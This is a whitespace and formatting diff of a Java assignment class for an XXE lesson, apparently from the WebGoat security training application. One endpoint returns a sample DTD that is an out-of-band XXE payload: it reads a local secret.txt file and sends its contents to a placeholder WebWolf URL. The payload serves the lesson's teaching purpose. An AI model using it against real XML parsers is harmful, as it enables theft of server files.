@@ -48,16 +48,16 @@ import static org.springframework.http.MediaType.APPLICATION_JSON_VALUE;
 @AssignmentHints({"xxe.hints.simple.xxe.1", "xxe.hints.simple.xxe.2", "xxe.hints.simple.xxe.3", "xxe.hints.simple.xxe.4", "xxe.hints.simple.xxe.5", "xxe.hints.simple.xxe.6"})
 public class SimpleXXE extends AssignmentEndpoint {
 
-    private final static String[] DEFAULT_LINUX_DIRECTORIES = {"usr", "etc", "var"};
-    private final static String[] DEFAULT_WINDOWS_DIRECTORIES = {"Windows", "Program Files (x86)", "Program Files"};
+    private static final String[] DEFAULT_LINUX_DIRECTORIES = {"usr", "etc", "var"};
+    private static final String[] DEFAULT_WINDOWS_DIRECTORIES = {"Windows", "Program Files (x86)", "Program Files"};
 
     @Value("${webgoat.server.directory}")
     private String webGoatHomeDirectory;
-    
+
     @Value("${webwolf.url.landingpage}")
     private String webWolfURL;
-    
-    
+
+
     @Autowired
     private Comments comments;
 
@@ -85,20 +85,20 @@ public class SimpleXXE extends AssignmentEndpoint {
         }
         return success;
     }
-    
-    @RequestMapping(path="/xxe/tmpdir",consumes = ALL_VALUE, produces=MediaType.TEXT_PLAIN_VALUE)
+
+    @RequestMapping(path = "/xxe/tmpdir", consumes = ALL_VALUE, produces = MediaType.TEXT_PLAIN_VALUE)
     @ResponseBody
     public String getWebGoatHomeDirectory() {
-    	return webGoatHomeDirectory;
+        return webGoatHomeDirectory;
     }
-    
-    @RequestMapping(path="/xxe/sampledtd",consumes = ALL_VALUE, produces=MediaType.TEXT_PLAIN_VALUE)
+
+    @RequestMapping(path = "/xxe/sampledtd", consumes = ALL_VALUE, produces = MediaType.TEXT_PLAIN_VALUE)
     @ResponseBody
     public String getSampleDTDFile() {
-    	return "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n" + 
-    			"<!ENTITY % file SYSTEM \"file:replace-this-by-webgoat-temp-directory/XXE/secret.txt\">\n" + 
-    			"<!ENTITY % all \"<!ENTITY send SYSTEM 'http://replace-this-by-webwolf-base-url/landing?text=%file;'>\">\n" + 
-    			"%all;";
+        return "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n"
+                + "<!ENTITY % file SYSTEM \"file:replace-this-by-webgoat-temp-directory/XXE/secret.txt\">\n"
+                + "<!ENTITY % all \"<!ENTITY send SYSTEM 'http://replace-this-by-webwolf-base-url/landing?text=%file;'>\">\n"
+                + "%all;";
     }
-    
+
 }
